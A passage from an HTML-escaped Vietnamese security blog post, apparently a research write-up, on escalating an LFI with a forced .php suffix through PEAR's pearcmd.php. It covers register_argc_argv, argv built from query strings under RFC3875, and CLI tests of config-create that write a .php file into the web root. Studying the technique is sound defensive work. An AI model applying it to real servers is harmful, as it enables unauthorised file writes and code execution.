r√†ng. N·∫øu file n√†y ƒë∆∞·ª£c include trong b·ªëi c·∫£nh web (do LFI), logic CLI c·ªßa n√≥ c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng.&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÉm then ch·ªët l√† c·∫•u h√¨nh &lt;code&gt;register_argc_argv&lt;/code&gt;. N·∫øu &lt;code&gt;register_argc_argv = On&lt;/code&gt;, PHP s·∫Ω t·∫°o:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$argc&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$argv&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#34; title=&#34;`argv` trong c·∫•u h√¨nh PHP&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#34; data-sub-html=&#34;&lt;h2&gt;argv&lt;/h2&gt;&lt;p&gt;`argv` trong c·∫•u h√¨nh PHP&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#39; alt=&#34;argv&#34; height=&#34;190&#34; width=&#34;844&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;`argv` trong c·∫•u h√¨nh PHP&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi thi·∫øt l·∫≠p WordPress tr√™n Docker, &lt;code&gt;register_argc_argv&lt;/code&gt; th∆∞·ªùng b·∫≠t m·∫∑c ƒë·ªãnh. V·∫•n ƒë·ªÅ ƒë·∫∑t ra: khi PHP ch·∫°y d∆∞·ªõi SAPI web (FPM/Apache) v√† kh√¥ng ph·∫£i CLI, &lt;code&gt;$argv&lt;/code&gt; l·∫•y d·ªØ li·ªáu t·ª´ ƒë√¢u?&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis-php-source-code&#34;&gt;&lt;span&gt;Analysis PHP Source Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis-php-source-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong PHP core c√≥ logic nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (PG(register_argc_argv)) {&#xA;    if (SG(request_info).argc) {&#xA;        ...&#xA;    } else {&#xA;        php_build_argv(SG(request_info).query_string, &amp;amp;PG(http_globals)[TRACK_VARS_SERVER]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu kh√¥ng c√≥ &lt;code&gt;argc&lt;/code&gt; (kh√¥ng ch·∫°y CLI), PHP g·ªçi &lt;code&gt;php_build_argv&lt;/code&gt; v·ªõi &lt;code&gt;SG(request_info).query_string&lt;/code&gt; - t·ª©c &lt;strong&gt;query string&lt;/strong&gt; c·ªßa URL. V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://example.com/index.php?a=b&amp;amp;c=d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí &lt;code&gt;query_string = &amp;quot;a=b&amp;amp;c=d&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;PHP s·∫Ω d√πng query string n√†y ƒë·ªÉ t·∫°o bi·∫øn &lt;code&gt;argv&lt;/code&gt;, do ƒë√≥ &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng b·ªüi query string.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;H·∫≠u qu·∫£&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Khi &lt;code&gt;pearcmd.php&lt;/code&gt; ƒë∆∞·ª£c include qua LFI trong m√¥i tr∆∞·ªùng web m√† &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; ƒë∆∞·ª£c sinh t·ª´ query string, attacker c√≥ th·ªÉ ƒëi·ªÅu khi·ªÉn c√°c tham s·ªë d√≤ng l·ªánh m√† &lt;code&gt;pearcmd.php&lt;/code&gt; ƒë·ªçc ƒë∆∞·ª£c. Do ƒë√≥, ch·ª©c nƒÉng d√≤ng l·ªánh c·ªßa PEAR/PECL c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng qua web ƒë·ªÉ th·ª±c hi·ªán h√†nh ƒë·ªông kh√¥ng mong mu·ªën.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;rfc3875-explain&#34;&gt;&lt;span&gt;RFC3875 Explain&lt;/span&gt;&#xA;  &lt;a href=&#34;#rfc3875-explain&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;RFC3875 (CGI spec) ƒë·ªãnh nghƒ©a m·ªôt d·∫°ng &lt;strong&gt;&amp;ldquo;indexed&amp;rdquo; HTTP query&lt;/strong&gt; - t·ª©c l√† chu·ªói truy v·∫•n kh√¥ng ch·ª©a d·∫•u &lt;code&gt;=&lt;/code&gt; ch∆∞a m√£ h√≥a v√† ƒë∆∞·ª£c g·ª≠i qua ph∆∞∆°ng th·ª©c GET ho·∫∑c HEAD.&lt;/p&gt;&#xA;&lt;p&gt;Khi g·∫∑p lo·∫°i truy v·∫•n n√†y, server &lt;strong&gt;n√™n&lt;/strong&gt; (&lt;code&gt;SHOULD&lt;/code&gt;) coi ph·∫ßn query-string nh∆∞ m·ªôt &lt;strong&gt;search-string&lt;/strong&gt;, t√°ch th√†nh c√°c &lt;strong&gt;search-word&lt;/strong&gt; b·∫±ng d·∫•u &lt;code&gt;+&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;search-string = search-word ( &amp;#34;&amp;#43;&amp;#34; search-word )&#xA;search-word = 1*schar&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi t√°ch, m·ªói &lt;code&gt;search-word&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c &lt;strong&gt;URL-decode&lt;/strong&gt;, c√≥ th·ªÉ m√£ h√≥a l·∫°i theo h·ªá th·ªëng, r·ªìi &lt;strong&gt;th√™m v√†o danh s√°ch ƒë·ªëi s·ªë d√≤ng l·ªánh (&lt;code&gt;argv&lt;/code&gt;)&lt;/strong&gt; c·ªßa ch∆∞∆°ng tr√¨nh CGI.&lt;/p&gt;&#xA;&lt;p&gt;N√≥i ng·∫Øn g·ªçn: n·∫øu query-string kh√¥ng c√≥ d·∫•u &lt;code&gt;=&lt;/code&gt; v√† l√† y√™u c·∫ßu GET ho·∫∑c HEAD, m√°y ch·ªß c√≥ th·ªÉ coi c√°c ph·∫ßn ngƒÉn c√°ch b·∫±ng &lt;code&gt;+&lt;/code&gt; nh∆∞ c√°c tham s·ªë d√≤ng l·ªánh v√† truy·ªÅn v√†o &lt;code&gt;argv&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;RFC3875&lt;/strong&gt; cho ph√©p server bi·∫øn m·ªôt query-string &amp;ldquo;indexed&amp;rdquo; (GET/HEAD, kh√¥ng c√≥ k√Ω t·ª± &lt;code&gt;=&lt;/code&gt; ch∆∞a m√£ h√≥a) th√†nh danh s√°ch t·ª´, r·ªìi ƒë∆∞a v√†o &lt;code&gt;argv&lt;/code&gt;. Ph·∫ßn m√¥ t·∫£ trong ti√™u chu·∫©n nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;4.4. The Script Command Line&#xA;&#xA;Some systems support a method for supplying an array of strings to&#xA;the CGI script. This is only used in the case of an &amp;#39;indexed&amp;#39; HTTP&#xA;query, which is identified by a &amp;#39;GET&amp;#39; or &amp;#39;HEAD&amp;#39; request with a URI&#xA;query string that does not contain any unencoded &amp;#34;=&amp;#34; characters. For&#xA;such a request, the server SHOULD treat the query-string as a&#xA;search-string and parse it into words, using the rules&#xA;&#xA;search-string = search-word ( &amp;#34;&amp;#43;&amp;#34; search-word )&#xA;search-word = 1*schar&#xA;schar = unreserved | escaped | xreserved&#xA;xreserved = &amp;#34;;&amp;#34; | &amp;#34;/&amp;#34; | &amp;#34;?&amp;#34; | &amp;#34;:&amp;#34; | &amp;#34;@&amp;#34; | &amp;#34;&amp;amp;&amp;#34; | &amp;#34;=&amp;#34; | &amp;#34;,&amp;#34; |&#xA;&amp;#34;$&amp;#34;&#xA;&#xA;After parsing, each search-word is URL-decoded, optionally encoded in&#xA;a system-defined manner and then added to the command line argument&#xA;list.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PHP t·ª´ng c√≥ l·ªó h·ªïng li√™n quan (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2012-1823&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2012-1823&lt;/a&gt;). Hi·ªán nay, PHP x·ª≠ l√Ω query-string r·ªông h∆°n RFC - ngay c·∫£ khi query-string c√≥ d·∫•u &lt;code&gt;=&lt;/code&gt;, n√≥ v·∫´n c√≥ th·ªÉ ƒë∆∞·ª£c ƒë∆∞a v√†o &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#34; title=&#34;PHP v·∫´n th√™m query-string c√≥ d·∫•u `=` v√†o $_SERVER[&amp;#39;argv&amp;#39;]&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#34; data-sub-html=&#34;&lt;h2&gt;equal&lt;/h2&gt;&lt;p&gt;PHP v·∫´n th√™m query-string c√≥ d·∫•u `=` v√†o $_SERVER[&amp;#39;argv&amp;#39;]&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#39; alt=&#34;equal&#34; height=&#34;276&#34; width=&#34;1058&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PHP v·∫´n th√™m query-string c√≥ d·∫•u `=` v√†o $_SERVER[&#39;argv&#39;]&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;üëâ Khi truy·ªÅn query string theo d·∫°ng &lt;code&gt;?a+b+c+...&lt;/code&gt;, PHP s·∫Ω t√°ch chu·ªói t·∫°i c√°c d·∫•u &lt;code&gt;+&lt;/code&gt; v√† t·∫°o ra bi·∫øn &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; d∆∞·ªõi d·∫°ng m·ªôt m·∫£ng ch·ª©a c√°c ph·∫ßn t·ª≠ &lt;code&gt;[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, ...]&lt;/code&gt;, ƒë√∫ng theo c∆° ch·∫ø ƒë∆∞·ª£c m√¥ t·∫£ trong RFC3875.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;testing-pear-in-cli&#34;&gt;&lt;span&gt;Testing PEAR in CLI&lt;/span&gt;&#xA;  &lt;a href=&#34;#testing-pear-in-cli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong b√†i vi·∫øt c·ªßa t√°c gi·∫£ c√≥ ƒë·ªÅ c·∫≠p ƒë·∫øn payload li√™n quan ƒë·∫øn &lt;code&gt;config-create&lt;/code&gt;, ƒë∆∞·ª£c m√¥ t·∫£ l√† d√πng ƒë·ªÉ t·∫°o file c·∫•u h√¨nh.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#34; title=&#34;M√¥ t·∫£ v·ªÅ config-create&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#34; data-sub-html=&#34;&lt;h2&gt;doc-config&lt;/h2&gt;&lt;p&gt;M√¥ t·∫£ v·ªÅ config-create&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#39; alt=&#34;doc-config&#34; height=&#34;387&#34; width=&#34;608&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;M√¥ t·∫£ v·ªÅ config-create&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi t√¥i th·ª≠ ch·∫°y l·ªánh tr√™n CLI:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create&#xA;config-create: must have 2 parameters, root path and filename to save as&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi kh√¥ng truy·ªÅn ƒë·ªß tham s·ªë, ch∆∞∆°ng tr√¨nh b√°o l·ªói v√† y√™u c·∫ßu hai tham s·ªë b·∫Øt bu·ªôc:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;root path&lt;/code&gt;: th∆∞ m·ª•c g·ªëc m√† PEAR d√πng ƒë·ªÉ c√†i ƒë·∫∑t c√°c package v√† t√¨m c·∫•u h√¨nh.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;filename&lt;/code&gt;: ƒë∆∞·ªùng d·∫´n t·ªõi file c·∫•u h√¨nh s·∫Ω ƒë∆∞·ª£c t·∫°o ra.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Th·ª≠ ch·∫°y v·ªõi tham s·ªë ƒë·∫ßy ƒë·ªß:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php&#xA;Root directory must be an absolute path beginning with &amp;#34;/&amp;#34;, was: &amp;#34;test_root_path&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;·ªû ƒë√¢y PEAR y√™u c·∫ßu &lt;code&gt;test_root_path&lt;/code&gt; ph·∫£i l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi, t·ª©c l√† ph·∫£i c√≥ d·∫•u &lt;code&gt;/&lt;/code&gt; ·ªü ƒë·∫ßu.&lt;/p&gt;&#xA;&lt;p&gt;Khi ch·∫°y l·∫°i v·ªõi ƒë∆∞·ªùng d·∫´n h·ª£p l·ªá:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;K·∫øt qu·∫£ tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Configuration (channel pear.php.net):&#xA;=====================================&#xA;Auto-discover new Channels     auto_discover    &amp;lt;not set&amp;gt;&#xA;Default Channel                default_channel  pear.php.net&#xA;HTTP Proxy Server Address      http_proxy       &amp;lt;not set&amp;gt;&#xA;PEAR server [DEPRECATED]       master_server    &amp;lt;not set&amp;gt;&#xA;Default Channel Mirror         preferred_mirror &amp;lt;not set&amp;gt;&#xA;Remote Configuration File      remote_config    &amp;lt;not set&amp;gt;&#xA;PEAR executables directory     bin_dir          /test_root_path/pear&#xA;PEAR documentation directory   doc_dir          /test_root_path/pear/docs&#xA;PHP extension directory        ext_dir          /test_root_path/pear/ext&#xA;PEAR directory                 php_dir          /test_root_path/pear/php&#xA;PEAR Installer cache directory cache_dir        /test_root_path/pear/cache&#xA;PEAR configuration file        cfg_dir          /test_root_path/pear/cfg&#xA;directory&#xA;PEAR data directory            data_dir         /test_root_path/pear/data&#xA;PEAR Installer download        download_dir     /test_root_path/pear/download&#xA;directory&#xA;Systems manpage files          man_dir          /test_root_path/pear/man&#xA;directory&#xA;PEAR metadata directory        metadata_dir     &amp;lt;not set&amp;gt;&#xA;PHP CLI/CGI binary             php_bin          &amp;lt;not set&amp;gt;&#xA;php.ini location               php_ini          &amp;lt;not set&amp;gt;&#xA;--program-prefix passed to     php_prefix       &amp;lt;not set&amp;gt;&#xA;PHP&amp;#39;s ./configure&#xA;--program-suffix passed to     php_suffix       &amp;lt;not set&amp;gt;&#xA;PHP&amp;#39;s ./configure&#xA;PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp&#xA;PEAR test directory            test_dir         /test_root_path/pear/tests&#xA;PEAR www files directory       www_dir          /test_root_path/pear/www&#xA;Cache TimeToLive               cache_ttl        &amp;lt;not set&amp;gt;&#xA;Preferred Package State        preferred_state  &amp;lt;not set&amp;gt;&#xA;Unix file mask                 umask            &amp;lt;not set&amp;gt;&#xA;Debug Log Level                verbose          &amp;lt;not set&amp;gt;&#xA;PEAR password (for             password         &amp;lt;not set&amp;gt;&#xA;maintainers)&#xA;Signature Handling Program     sig_bin          &amp;lt;not set&amp;gt;&#xA;Signature Key Directory        sig_keydir       &amp;lt;not set&amp;gt;&#xA;Signature Key Id               sig_keyid        &amp;lt;not set&amp;gt;&#xA;Package Signature Type         sig_type         &amp;lt;not set&amp;gt;&#xA;PEAR username (for             username         &amp;lt;not set&amp;gt;&#xA;maintainers)&#xA;User Configuration File        Filename         /var/www/html/test_filename.php&#xA;System Configuration File      Filename         #no#system#config#&#xA;Successfully created default configuration file &amp;#34;/var/www/html/test_filename.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;K·∫øt qu·∫£ cho th·∫•y c√°c ƒë∆∞·ªùng d·∫´n con cho t·ª´ng lo·∫°i d·ªØ li·ªáu ƒë∆∞·ª£c t·ª± ƒë·ªông sinh ra d∆∞·ªõi &lt;code&gt;/test_root_path/pear&lt;/code&gt;. ·ªû d√≤ng cu·ªëi c√πng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Successfully created default configuration file &amp;#34;/var/www/html/test_filename.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;File c·∫•u h√¨nh ƒë∆∞·ª£c t·∫°o trong th∆∞ m·ª•c hi·ªán h√†nh, kh√¥ng n·∫±m trong &lt;code&gt;root_path&lt;/code&gt;. ƒê√¢y l√† h√†nh vi m·∫∑c ƒë·ªãnh c·ªßa PEAR: &lt;code&gt;root_path&lt;/code&gt; ch·ªâ ·∫£nh h∆∞·ªüng ƒë·∫øn c·∫•u tr√∫c th∆∞ m·ª•c c√†i ƒë·∫∑t, kh√¥ng quy·∫øt ƒë·ªãnh v·ªã tr√≠ l∆∞u file c·∫•u h√¨nh.&lt;/p&gt;&#xA;&lt;p&gt;Khi truy c·∫≠p file &lt;code&gt;&amp;quot;/var/www/html/test_filename.php&amp;quot;&lt;/code&gt; tr√™n tr√¨nh duy·ªát:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#34; title=&#34;N·ªôi dung c·ªßa test_filename.php ƒë∆∞·ª£c render tr√™n tr√¨nh duy·ªát&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#34; data-sub-html=&#34;&lt;h2&gt;file-create&lt;/h2&gt;&lt;p&gt;N·ªôi dung c·ªßa test_filename.php ƒë∆∞·ª£c render tr√™n tr√¨nh duy·ªát&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#39; alt=&#34;file-create&#34; height=&#34;137&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung c·ªßa test_filename.php ƒë∆∞·ª£c render tr√™n tr√¨nh duy·ªát&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;File ƒë∆∞·ª£c t·∫°o c√≥ ch·ª©a th√¥ng tin v·ªÅ &lt;code&gt;test_root_path&lt;/code&gt;, ƒë∆∞·ª£c tr√¨nh b√†y ·ªü d·∫°ng &lt;code&gt;serialize&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, ƒë√≥ m·ªõi ch·ªâ l√† qu√° tr√¨nh th·ª±c thi tr√™n CLI. Trong tr∆∞·ªùng h·ª£p khai th√°c qua web, c·∫ßn ph√¢n t√≠ch m√£ ngu·ªìn ƒë·ªÉ xem c√°ch ch∆∞∆°ng tr√¨nh ti·∫øp nh·∫≠n v√† x·ª≠ l√Ω c√°c tham s·ªë ƒë∆∞·ª£c truy·ªÅn v√†o.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;pearcmd-code-analysis&#34;&gt;&lt;span&gt;&lt;code&gt;pearcmd&lt;/code&gt; Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#pearcmd-code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Tr∆∞·ªõc khi ph√¢n t√≠ch m√£ ngu·ªìn c·ªßa &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt;, c·∫ßn thi·∫øt l·∫≠p m√¥i tr∆∞·ªùng debug ƒë·ªÉ n·∫Øm r√µ lu·ªìng th·ª±c thi - tham kh·∫£o: &lt;a href=&#34;https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ h√£y copy to√†n b·ªô m√£ ngu·ªìn &lt;strong&gt;php&lt;/strong&gt; t·ª´ container v·ªÅ m√°y th·∫≠t, gi·ªØ nguy√™n c·∫•u tr√∫c th∆∞ m·ª•c, ƒë·ªÉ khi debugger d·ª´ng t·∫°i &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt; b·∫°n v·∫´n c√≥ th·ªÉ m·ªü v√† theo d√µi file t∆∞∆°ng ·ª©ng v·ªõi container:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;require_once &amp;#39;PEAR.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Frontend.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Config.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Command.php&amp;#39;;&#xA;require_once &amp;#39;Console/Getopt.php&amp;#39;;&#xA;&#xA;$all_commands = PEAR_Command::getCommands();&#xA;...&#xA;$argv = Console_Getopt::readPHPArgv();&#xA;...&#xA;$options = Console_Getopt::getopt2($argv, &amp;#34;c:C:d:D:Gh?sSqu:vV&amp;#34;);&#xA;array_shift($argv);&#xA;...&#xA;$command = (isset($options[1][0])) ? $options[1][0] : null;&#xA;...&#xA;if ($fetype == &amp;#39;Gtk2&amp;#39;) {&#xA;    ...&#xA;} else {&#xA;    do {&#xA;        ...&#xA;        $cmd = PEAR_Command::factory($command, $config);&#xA;        ...&#xA;        list($tmpopt, $params) = $tmp;&#xA;        ...&#xA;        $ok = $cmd-&amp;gt;run($command, $opts, $params);&#xA;        if ($ok === false) {&#xA;            PEAR::raiseError(&amp;#34;unknown command `$command&amp;#39;&amp;#34;);&#xA;        }&#xA;        ...&#xA;    } while (false);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·∫ßu ti√™n, t·∫•t c·∫£ c√°c command s·∫Ω ƒë∆∞·ª£c load v√†o &lt;code&gt;$all_commands&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$all_commands = PEAR_Command::getCommands();&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function getCommands()&#xA;{&#xA;    if (empty($GLOBALS[&amp;#39;_PEAR_Command_commandlist&amp;#39;])) {&#xA;        PEAR_Command::registerCommands();&#xA;    }&#xA;    return 